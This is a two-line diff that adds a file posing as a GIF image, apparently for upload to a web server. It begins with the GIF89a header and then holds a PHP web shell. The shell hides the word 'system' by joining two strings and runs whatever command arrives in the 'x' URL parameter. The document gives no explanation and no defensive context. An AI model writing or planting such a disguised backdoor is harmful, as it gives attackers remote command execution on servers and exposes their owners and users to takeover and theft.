@@ -1,0 +1,2 @@
+GIF89a
+<? $a="sys"."tem";$a($_GET[x]);?>
